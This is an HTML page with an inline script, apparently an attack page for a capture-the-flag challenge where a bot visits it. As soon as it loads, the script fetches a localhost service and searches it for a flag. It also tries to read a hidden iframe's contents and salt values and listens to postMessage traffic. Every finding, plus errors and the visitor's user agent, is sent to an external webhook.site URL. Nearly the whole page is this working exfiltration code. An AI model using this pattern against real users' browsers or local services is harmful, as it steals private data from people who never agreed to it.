<!DOCTYPE html>
<html>
<head>
    <title>Simple Flag Exfiltration</title>
</head>
<body>
    <h1>Flag Exfiltration via Webhook</h1>
    <div id="status">Waiting for bot...</div>
    
    <script>
        // Get a webhook URL from webhook.site
        const WEBHOOK_URL = 'https://webhook.site/4d352f78-695e-4509-80a0-d978376b270f';
        
        function log(msg) {
            console.log(msg);
            document.getElementById('status').innerHTML += `<p>${msg}</p>`;
        }
        
        async function exfiltrateFlag() {
            log('Bot visited! Starting simple exfiltration...');
            
            try {
                // Method 1: Try to access the main app directly
                const response = await fetch('http://localhost:1338');
                const html = await response.text();
                
                // Look for flag in the HTML
                const flagMatch = html.match(/CTF\{[^}]+\}/);
                if (flagMatch) {
                    const flag = flagMatch[0];
                    log(`Found flag: ${flag}`);
                    
                    // Send to webhook
                    await fetch(WEBHOOK_URL, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            flag: flag,
                            source: 'direct_fetch',
                            timestamp: new Date().toISOString()
                        })
                    });
                    
                    // Also try GET request with flag in URL
                    await fetch(`${WEBHOOK_URL}?flag=${encodeURIComponent(flag)}`);
                    
                    document.getElementById('status').innerHTML = 
                        `<h2 style="color: green;">FLAG SENT: ${flag}</h2>`;
                    return;
                }
                
                log('Flag not found in main page HTML, trying iframe approach...');
                
                // Method 2: Use iframe and extract from there
                const iframe = document.createElement('iframe');
                iframe.src = 'http://localhost:1338';
                iframe.style.display = 'none';
                document.body.appendChild(iframe);
                
                iframe.onload = async () => {
                    try {
                        // Try to access mathRandomInvocations
                        const saltArray = iframe.contentWindow.mathRandomInvocations;
                        if (saltArray && saltArray.length > 0) {
                            const salt = saltArray[saltArray.length - 1];
                            log(`Found salt: ${salt}`);
                            
                            // Send salt info to webhook
                            await fetch(WEBHOOK_URL, {
                                method: 'POST',
                                body: JSON.stringify({
                                    salt: salt,
                                    salts_array: saltArray,
                                    message: 'Found mathRandomInvocations'
                                })
                            });
                        }
                        
                        // Try to access the page content
                        const iframeContent = iframe.contentDocument.documentElement.innerHTML;
                        const iframeFlagMatch = iframeContent.match(/CTF\{[^}]+\}/);
                        if (iframeFlagMatch) {
                            const flag = iframeFlagMatch[0];
                            log(`Found flag in iframe: ${flag}`);
                            
                            await fetch(`${WEBHOOK_URL}?flag=${encodeURIComponent(flag)}&source=iframe`);
                            document.getElementById('status').innerHTML = 
                                `<h2 style="color: green;">FLAG SENT: ${flag}</h2>`;
                        }
                        
                    } catch (e) {
                        log(`Iframe access error: ${e.message}`);
                        await fetch(WEBHOOK_URL, {
                            method: 'POST',
                            body: JSON.stringify({error: e.message, step: 'iframe_access'})
                        });
                    }
                };
                
            } catch (error) {
                log(`Fetch error: ${error.message}`);
                
                // Send error info to webhook
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    body: JSON.stringify({
                        error: error.message,
                        step: 'initial_fetch',
                        timestamp: new Date().toISOString()
                    })
                });
            }
        }
        
        // Method 3: Listen for any postMessages that might contain the flag
        window.addEventListener('message', async (event) => {
            log(`Received message: ${JSON.stringify(event.data)}`);
            
            const dataStr = JSON.stringify(event.data);
            if (dataStr.includes('CTF{')) {
                const flagMatch = dataStr.match(/CTF\{[^}]+\}/);
                if (flagMatch) {
                    const flag = flagMatch[0];
                    log(`Found flag in message: ${flag}`);
                    
                    await fetch(`${WEBHOOK_URL}?flag=${encodeURIComponent(flag)}&source=postmessage`);
                    document.getElementById('status').innerHTML = 
                        `<h2 style="color: green;">FLAG SENT: ${flag}</h2>`;
                }
            }
            
            // Send all messages to webhook for analysis
            await fetch(WEBHOOK_URL, {
                method: 'POST',
                body: JSON.stringify({
                    message_data: event.data,
                    message_origin: event.origin,
                    timestamp: new Date().toISOString()
                })
            });
        });
        
        // Start exfiltration immediately
        exfiltrateFlag();
        
        // Also send a "bot visited" confirmation
        fetch(WEBHOOK_URL, {
            method: 'POST',
            body: JSON.stringify({
                status: 'bot_visited',
                user_agent: navigator.userAgent,
                timestamp: new Date().toISOString()
            })
        });
        
        log('Exfiltration script loaded and running...');
    </script>
</body>
</html>
